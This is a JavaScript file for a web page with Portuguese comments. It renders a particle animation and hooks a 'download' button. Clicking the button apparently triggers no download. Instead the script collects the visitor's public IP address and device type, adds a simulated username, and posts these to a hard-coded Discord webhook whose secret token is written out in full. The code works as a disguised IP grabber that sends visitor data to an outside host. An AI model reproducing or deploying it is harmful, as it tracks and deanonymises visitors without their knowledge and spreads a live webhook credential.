document.addEventListener('DOMContentLoaded', () => {
    const particleBackground = document.querySelector('.particle-background');
    const numParticles = 100;
    const infoDiv = document.getElementById('info');

    for (let i = 0; i < numParticles; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        particle.style.width = `${Math.random() * 3 + 1}px`;
        particle.style.height = particle.style.width;
        particle.style.left = `${Math.random() * 100}vw`;
        particle.style.top = `${Math.random() * 100}vh`;
        particle.style.animationDuration = `${Math.random() * 5 + 5}s`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        particleBackground.appendChild(particle);
    }

    document.getElementById('downloadButton').addEventListener('click', async () => {
        try {
            const ip = await getIPAddress();
            const deviceInfo = await getDeviceInfo();
            const userInfo = await getUserInfo();
            const webhookText = `IP: ${ip}\nMarca do Dispositivo: ${deviceInfo}\nNome Completo: ${userInfo}`;

            infoDiv.innerText = webhookText;
            sendWebhook(webhookText);
        } catch (error) {
            infoDiv.innerText = `Erro: ${error.message}`;
        }
    });
});

async function getIPAddress() {
    // Obtém o IP público usando uma API externa
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
}

async function getDeviceInfo() {
    // Obtém informações sobre o dispositivo
    const userAgent = navigator.userAgent;
    let deviceInfo = 'Desconhecido';

    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
        deviceInfo = 'Celular';
    } else if (/Windows NT|Macintosh|Linux/i.test(userAgent)) {
        deviceInfo = 'PC';
    }

    return deviceInfo;
}

async function getUserInfo() {
    // Obtém o nome completo do usuário
    let userInfo = 'Desconhecido';

    if (navigator.userAgent.includes('Windows')) {
        // Para Windows, você pode usar a API de sistema operacional para obter o nome do usuário
        // No navegador, isso não é possível diretamente, então vamos simular
        userInfo = 'Nome do Usuário do Windows';
    } else if (navigator.userAgent.includes('Macintosh')) {
        // Para Mac, você pode usar a API de sistema operacional para obter o nome do usuário
        // No navegador, isso não é possível diretamente, então vamos simular
        userInfo = 'Nome do Usuário do Mac';
    } else if (navigator.userAgent.includes('Linux')) {
        // Para Linux, você pode usar a API de sistema operacional para obter o nome do usuário
        // No navegador, isso não é possível diretamente, então vamos simular
        userInfo = 'Nome do Usuário do Linux';
    } else if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        // Para dispositivos móveis, você pode usar a API de sistema operacional para obter o nome do usuário
        // No navegador, isso não é possível diretamente, então vamos simular
        userInfo = 'Nome do Usuário do Celular';
    }

    return userInfo;
}

function sendWebhook(text) {
    // Envia o texto para um webhook
    fetch('https://discord.com/api/webhooks/1499662564920000664/j_IYz_TcfwnnTEgS-Or1fzCclhg7YATKlxpCpZEXvfDq3cqwuLi_XqQr4paAlRrTWHmk', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: text })
    });
}
